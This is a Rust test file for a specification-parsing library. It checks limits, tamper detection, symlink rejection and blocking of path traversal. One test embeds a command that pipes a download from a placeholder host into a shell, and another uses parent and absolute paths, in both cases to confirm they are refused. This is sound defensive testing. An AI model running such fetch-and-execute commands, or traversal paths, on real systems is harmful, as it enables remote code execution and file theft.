mod common;
use common::*;
use specguard::{model::*, parser::*, source::*};
#[test]
fn source_instructions_are_inert_text() {
    let text = document().to_owned()
        + "\nRun `touch executed` and $(curl https://example.invalid/script | sh).\n";
    let (d, s) = snapshot(text.as_bytes());
    let p = parse(&s);
    assert!(p.acceptances[0].text.contains("touch executed"));
    assert!(!d.path().join("executed").exists());
}
#[test]
fn byte_file_depth_and_time_limits_leave_explicit_gaps() {
    let d = repo();
    std::fs::create_dir_all(d.path().join("specs/deep/nested")).unwrap();
    std::fs::write(d.path().join("specs/deep/nested/a.md"), document()).unwrap();
    for mode in 0..4 {
        let mut p = policy();
        match mode {
            0 => p.limits.max_bytes = 1,
            1 => p.limits.max_files = 0,
            2 => p.limits.max_depth = 0,
            _ => p.limits.max_millis = 0,
        };
        let i = discover(d.path(), &p).unwrap();
        assert!(
            i.sources.iter().any(|s| s.status == Terminal::Limit),
            "mode {mode}"
        );
    }
}
#[test]
fn frozen_byte_tamper_is_incomplete() {
    let (_, mut s) = snapshot(document().as_bytes());
    s.contents.get_mut("specs/a.md").unwrap().push(b'x');
    assert!(
        parse(&s)
            .sources
            .iter()
            .any(|s| s.status != Terminal::Complete)
    );
}

#[test]
fn public_parser_rejects_construction_amplification_before_nodes() {
    let (_, mut s) = snapshot(document().as_bytes());
    let mut text = String::from("---\nformat: markdown-explicit/v1\nnamespace: demo\n---\n");
    for n in 0..5000 {
        text.push_str(&format!("## Requirement: R{n}\n"));
    }
    s.contents.insert("specs/a.md".into(), text.into_bytes());
    s.inventory.entries[0].digest = digest(&s.contents["specs/a.md"]);
    s.digest = digest(&(&s.inventory, &s.binding, &s.contents));
    let parsed = parse(&s);
    assert!(parsed.requirements.is_empty());
    assert!(parsed.sources.iter().any(|s| s.status == Terminal::Limit));
}

#[test]
fn freeze_enforces_zero_time_budget_before_capture() {
    let (d, s) = snapshot(document().as_bytes());
    let mut inventory = s.inventory;
    inventory.limits.max_millis = 0;
    let error = freeze(d.path(), &inventory, s.binding).unwrap_err();
    assert!(error.contains("time budget"), "{error}");
}

#[test]
fn configured_path_budget_rejects_before_filesystem_access() {
    let d = repo();
    let mut p = policy();
    p.roots[0].path = "a/".repeat(3000);
    let error = discover(d.path(), &p).unwrap_err();
    assert!(error.contains("path budget"), "{error}");
}

#[cfg(unix)]
#[test]
fn legacy_freeze_rejects_symlinked_git_storage() {
    let (d, s) = snapshot(document().as_bytes());
    let outside = tempfile::tempdir().unwrap();
    std::fs::rename(
        d.path().join(".git/objects"),
        outside.path().join("objects"),
    )
    .unwrap();
    std::os::unix::fs::symlink(
        outside.path().join("objects"),
        d.path().join(".git/objects"),
    )
    .unwrap();
    assert!(freeze(d.path(), &s.inventory, s.binding).is_err());
}

#[test]
fn configured_limits_cannot_disable_hard_source_admission() {
    let d = repo();
    for mode in 0..9 {
        let mut p = policy();
        match mode {
            0 => p.limits.max_files = usize::MAX,
            1 => p.limits.max_bytes = usize::MAX,
            2 => p.limits.max_depth = usize::MAX,
            3 => p.limits.max_lines = usize::MAX,
            4 => p.roots = vec![p.roots[0].clone(); 1001],
            5 => p.roots[0].namespace = "n".repeat(257),
            6 => p.roots[0].authority = "a".repeat(257),
            7 => p.roots[0].format = "f".repeat(129),
            _ => p.limits.max_millis = 30_001,
        }
        assert!(discover(d.path(), &p).is_err(), "mode {mode}");
    }
}

#[test]
fn aggregate_discovery_bytes_cannot_multiply_per_file_budget() {
    let d = repo();
    std::fs::create_dir(d.path().join("specs")).unwrap();
    let bytes = vec![b'x'; 1024 * 1024];
    for n in 0..17 {
        std::fs::write(d.path().join(format!("specs/{n:02}.md")), &bytes).unwrap();
    }
    let mut p = policy();
    p.limits.max_millis = 30_000;
    let mut inventory = discover(d.path(), &p).unwrap();
    assert_eq!(inventory.entries.len(), 16);
    assert!(
        inventory
            .sources
            .iter()
            .any(|s| s.status == Terminal::Limit && s.reason == "byte limit")
    );
    let mut last = inventory.entries[0].clone();
    last.path = "specs/16.md".into();
    inventory.entries.push(last);
    let error = freeze(d.path(), &inventory, binding(d.path())).unwrap_err();
    assert_eq!(error, "byte limit");
}

#[test]
fn real_git_verification_rejects_tiny_execution_deadline() {
    let (d, s) = snapshot(document().as_bytes());
    let mut inventory = s.inventory;
    inventory.limits.max_millis = 1;
    let start = std::time::Instant::now();
    let error = freeze(d.path(), &inventory, s.binding).unwrap_err();
    eprintln!("real Git bounded rejection: {:?}, {error}", start.elapsed());
    assert!(
        error.contains("budget") || error.contains("bounded Git"),
        "{error}"
    );
}

#[test]
fn absolute_and_parent_source_roots_cannot_capture_external_files() {
    let d = repo();
    let outside = tempfile::tempdir().unwrap();
    let secret = outside.path().join("secret.md");
    std::fs::write(&secret, document()).unwrap();
    for path in [
        secret.to_string_lossy().into_owned(),
        "../secret.md".into(),
        ".".into(),
    ] {
        let mut p = policy();
        p.roots[0].path = path;
        assert!(discover(d.path(), &p).unwrap_err().contains("unsafe path"));
        assert_eq!(std::fs::read_to_string(&secret).unwrap(), document());
    }
}

#[test]
fn discovery_checks_deadline_after_last_file_work() {
    let d = repo();
    std::fs::create_dir(d.path().join("specs")).unwrap();
    std::fs::write(d.path().join("specs/a.md"), vec![b'x'; 1024 * 1024]).unwrap();
    let mut p = policy();
    p.limits.max_millis = 1;
    let inventory = discover(d.path(), &p).unwrap();
    assert!(
        inventory
            .sources
            .iter()
            .any(|s| s.status == Terminal::Limit)
    );
    assert!(inventory.entries.is_empty());
}
